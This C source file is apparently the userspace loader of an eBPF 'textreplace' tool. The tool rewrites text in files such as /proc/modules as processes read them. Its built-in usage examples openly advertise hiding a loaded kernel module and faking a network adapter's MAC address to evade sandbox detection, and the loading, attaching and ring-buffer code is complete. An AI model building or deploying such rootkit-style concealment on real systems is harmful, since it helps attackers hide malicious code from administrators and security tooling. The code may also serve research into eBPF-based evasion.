// SPDX-License-Identifier: BSD-3-Clause
#include <argp.h>
#include <unistd.h>
#include "replace.skel.h"
#include "replace.h"
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <unistd.h>
#include <signal.h>
#include <sys/resource.h>
#include <errno.h>
#include <fcntl.h>

static volatile sig_atomic_t exiting;

void sig_int(int signo)
{
    exiting = 1;
}

static bool setup_sig_handler() {
    // Add handlers for SIGINT and SIGTERM so we shutdown cleanly
    __sighandler_t sighandler = signal(SIGINT, sig_int);
    if (sighandler == SIG_ERR) {
        fprintf(stderr, "can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    sighandler = signal(SIGTERM, sig_int);
    if (sighandler == SIG_ERR) {
        fprintf(stderr, "can't set signal handler: %s\n", strerror(errno));
        return false;
    }
    return true;
}

static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    return vfprintf(stderr, format, args);
}

static bool bump_memlock_rlimit(void)
{
    struct rlimit rlim_new = {
        .rlim_cur    = RLIM_INFINITY,
        .rlim_max    = RLIM_INFINITY,
    };

    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) {
        fprintf(stderr, "Failed to increase RLIMIT_MEMLOCK limit! (hint: run as root)\n");
        return false;
    }
    return true;
}


static bool setup() {
    // Set up libbpf errors and debug info callback 
    libbpf_set_print(libbpf_print_fn);

    // Bump RLIMIT_MEMLOCK to allow BPF sub-system to do anything 
    if (!bump_memlock_rlimit()) {
        return false;
    };

    // Setup signal handler so we exit cleanly
    if (!setup_sig_handler()) {
        return false;
    }

    return true;
}

// Setup Argument stuff
#define filename_len_max 50
#define text_len_max 20
static struct env {
    char filename[filename_len_max];
    char input[filename_len_max];
    char replace[filename_len_max];
    int target_ppid;
} env;

const char *argp_program_version = "textreplace 1.0";
const char *argp_program_bug_address = "<path@tofile.dev>";
const char argp_program_doc[] =
"Text Replace\n"
"\n"
"Replaces text in a file.\n"
"To pass in newlines use \%'\\n' e.g.:\n"
"    ./textreplace -f /proc/modules -i ppdev -r $'aaaa\\n'"
"\n"
"USAGE: ./textreplace -f filename -i input -r output [-t 1111]\n"
"EXAMPLES:\n"
"Hide kernel module:\n"
"  ./textreplace -f /proc/modules -i 'joydev' -r 'cryptd'\n"
"Fake Ethernet adapter (used in sandbox detection):  \n"
"  ./textreplace -f /sys/class/net/eth0/address -i '00:15:5d:01:ca:05' -r '00:00:00:00:00:00'  \n"
"";

static const struct argp_option opts[] = {
    { "filename", 'f', "FILENAME", 0, "Path to file to replace text in" },
    { "input", 'i', "INPUT", 0, "Text to be replaced in file, max 20 chars" },
    { "replace", 'r', "REPLACE", 0, "Text to replace with in file, must be same size as -t" },
    { "target-ppid", 't', "PPID", 0, "Optional Parent PID, will only affect its children." },
    {},
};
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'i':
        if (strlen(arg) >= text_len_max) {
            fprintf(stderr, "Text must be less than %d characters\n", filename_len_max);
            argp_usage(state);
        }
        strncpy(env.input, arg, sizeof(env.input));
        break;
    case 'r':
        if (strlen(arg) >= text_len_max) {
            fprintf(stderr, "Text must be less than %d characters\n", filename_len_max);
            argp_usage(state);
        }
        strncpy(env.replace, arg, sizeof(env.replace));
        break;
    case 'f':
        if (strlen(arg) >= filename_len_max) {
            fprintf(stderr, "Filename must be less than %d characters\n", filename_len_max);
            argp_usage(state);
        }
        strncpy(env.filename, arg, sizeof(env.filename));
        break;
    case 't':
        errno = 0;
        env.target_ppid = strtol(arg, NULL, 10);
        if (errno || env.target_ppid <= 0) {
            fprintf(stderr, "Invalid pid: %s\n", arg);
            argp_usage(state);
        }
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

static int handle_event(void *ctx, void *data, size_t data_sz)
{
    const struct event *e = data;
    if (e->success)
        printf("Replaced text in PID %d (%s)\n", e->pid, e->comm);
    else
        printf("Failed to replace text in PID %d (%s)\n", e->pid, e->comm);
    return 0;
}

int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct replace_bpf *skel;
    int err;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) {
        return err;
    }
    if (env.filename[0] == '\x00' || env.input[0] == '\x00' || env.replace[0] == '\x00') {
        printf("ERROR: filename, input, and replace all requried, see %s --help\n", argv[0]);
        exit(1);
    }
    if (strlen(env.input) != strlen(env.replace)) {
        printf("ERROR: input and replace text must be the same length\n");
        exit(1);
    }

    // Do common setup
    if (!setup()) {
        exit(1);
    }

    // Open BPF application 
    skel = replace_bpf__open();
    if (!skel) {
        fprintf(stderr, "Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Let bpf program know our pid so we don't get kiled by it
    strncpy(skel->rodata->filename, env.filename, sizeof(skel->rodata->filename));
    skel->rodata->filename_len = strlen(env.filename);
    skel->rodata->target_ppid = env.target_ppid;

    strncpy(skel->rodata->text_find, env.input, sizeof(skel->rodata->text_find));
    strncpy(skel->rodata->text_replace, env.replace, sizeof(skel->rodata->text_replace));
    skel->rodata->text_len = strlen(env.input);

    // Verify and load program
    err = replace_bpf__load(skel);
	if (err) {
		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
		goto cleanup;
	}

    // Add program to map so we can call it later
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.check_possible_addresses);
    int ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.overwrite_addresses);
    ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (ret == -1) {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }

    // Attach tracepoint handler 
    err = replace_bpf__attach( skel);
    if (err) {
        fprintf(stderr, "Failed to attach BPF program: %s\n", strerror(errno));
        goto cleanup;
    }

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "Failed to create ring buffer\n");
        goto cleanup;
    }

    printf("Successfully started!\n");
    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            printf("Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    replace_bpf__destroy( skel);
    return -err;
}
